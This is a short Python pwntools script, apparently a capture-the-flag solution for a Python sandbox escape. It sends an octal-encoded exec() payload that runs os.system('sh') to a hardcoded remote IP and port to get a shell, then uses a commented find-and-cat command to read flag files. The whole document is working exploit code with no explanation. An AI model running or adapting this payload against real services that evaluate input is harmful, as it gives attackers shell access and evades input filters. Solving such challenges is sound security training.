from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-R", action="store_true")
args = parser.parse_args()

REMOTE_HOST = "34.170.146.252"
REMOTE_PORT = 52877
LOCAL_HOST = "localhost"
LOCAL_PORT = 1337

if args.R:
    r = remote(REMOTE_HOST, REMOTE_PORT)
else:
    r = remote(LOCAL_HOST, LOCAL_PORT)


target_code = "__import__('os').system('sh')"

def octal_encode(code: str) -> str:
    return "".join(f"\\{ord(c):03o}" for c in code)

octal_payload = octal_encode(target_code)
payload = f'exec("{octal_payload}")'

r.sendline(payload.encode())

r.interactive()

# find /flag*.txt | xargs cat
